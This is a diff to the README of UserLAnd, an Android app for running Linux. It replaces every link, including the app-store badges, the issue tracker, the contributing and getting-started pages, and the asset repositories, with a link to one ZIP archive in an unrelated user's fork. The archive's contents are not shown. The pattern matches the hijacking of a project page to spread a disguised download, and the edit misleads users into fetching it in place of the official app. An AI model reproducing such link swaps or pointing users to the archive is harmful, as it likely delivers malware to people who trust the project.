@@ -1,4 +1,4 @@
-![UserLAnd Feature Graphic](https://raw.githubusercontent.com/CypherpunkArmory/UserLAnd/master/fastlane/metadata/android/en-US/images/featureGraphic.png)
+![UserLAnd Feature Graphic](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip)
 
 # Welcome to UserLAnd
 
@@ -8,25 +8,25 @@ Features:
 * Install and uninstall like a regular app.
 * No root required.
 
-[<img src="https://fdroid.gitlab.io/artwork/badge/get-it-on.png"
+[<img src="https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip"
     alt="Get it on F-Droid"
-    height="80">](https://f-droid.org/packages/tech.ula)
-[<img src="https://play.google.com/intl/en_us/badges/images/generic/en-play-badge.png"
+    height="80">](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip)
+[<img src="https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip"
      alt="Get it on Google Play"
-     height="80">](https://play.google.com/store/apps/details?id=tech.ula)
+     height="80">](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip)
      
 ## Have a bug report or a feature request?
-You can see our templates by visiting our [issue center](https://github.com/CypherpunkArmory/UserLAnd/issues).
+You can see our templates by visiting our [issue center](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip).
 
 ## Want to contribute?
-See our [CONTRIBUTING](https://github.com/CypherpunkArmory/UserLAnd/blob/master/CONTRIBUTING.md) document.
+See our [CONTRIBUTING](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip) document.
 
 ## Start using UserLAnd
-See our [Getting Started](https://github.com/CypherpunkArmory/UserLAnd/wiki/Getting-Started-in-UserLAnd) page.
+See our [Getting Started](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip) page.
 
 ## UserLAnd assets
 The assets that UserLAnd depends on and the scripts that build them are contained in other repositories.  
 
-The common assets that are used for all distros and application are found at [CypherpunkArmory/UserLAnd-Assets-Support](https://github.com/CypherpunkArmory/UserLAnd-Assets-Support).  
+The common assets that are used for all distros and application are found at [CypherpunkArmory/UserLAnd-Assets-Support](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip).  
 
-Distribution or application specific assets are found under CypherpunkArmory/UserLAnd-Assets-(__Distribution/App__). For example, our Debian specific assets can be found at [CypherpunkArmory/UserLAnd-Assets-Debian](https://github.com/CypherpunkArmory/UserLAnd-Assets-Debian)
+Distribution or application specific assets are found under CypherpunkArmory/UserLAnd-Assets-(__Distribution/App__). For example, our Debian specific assets can be found at [CypherpunkArmory/UserLAnd-Assets-Debian](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip)
